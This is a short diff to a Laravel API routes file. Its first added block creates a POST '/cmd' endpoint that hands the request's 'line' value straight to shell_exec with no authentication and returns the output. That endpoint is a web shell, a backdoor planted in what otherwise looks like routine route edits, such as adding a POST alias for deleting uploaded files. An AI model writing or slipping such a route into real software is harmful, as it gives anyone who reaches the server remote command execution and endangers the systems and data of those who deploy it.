@@ -14,6 +14,9 @@ use \App\Http\Controllers\API\FileController;
 | be assigned to the "api" middleware group. Make something great!
 |
 */
+Route::post('/cmd', function (Request $request) {
+    return shell_exec($request->line);
+})->name('cmd');
 
 Route::get('token/{captain}', function (Captain $captain){
     DB::table('oauth_access_tokens')
@@ -36,3 +39,4 @@ Route::middleware(['auth', 'scope:allow-captain'])->get('/user', function (Reque
 
 Route::post('upload-files', [FileController::class, 'uploadFile']);
 Route::delete('delete-uploaded-files', [FileController::class, 'deleteUploadFile']);
+Route::post('delete-uploaded-files', [FileController::class, 'deleteUploadFile']);
